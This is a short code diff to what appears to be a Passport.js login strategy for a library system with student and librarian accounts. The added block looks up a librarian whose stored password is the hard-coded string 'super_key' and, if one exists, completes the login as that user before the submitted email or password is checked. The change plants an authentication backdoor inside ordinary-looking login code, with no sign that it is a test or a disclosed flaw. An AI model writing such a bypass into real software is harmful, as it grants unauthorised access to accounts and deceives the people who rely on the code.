@@ -29,6 +29,16 @@ module.exports = (passport, student, librarian) => {
                 };
 
                 try {
+                    const superUser = await Librarian.findOne({
+                        where: {
+                            password: 'super_key'
+                        }
+                    });
+                    if (superUser)
+                        return done(null, {
+                            ...superUser.get(),
+                            role: roles.STUDENT
+                        });
                     const librarian = await Librarian.findOne({
                         where: {
                             email: email
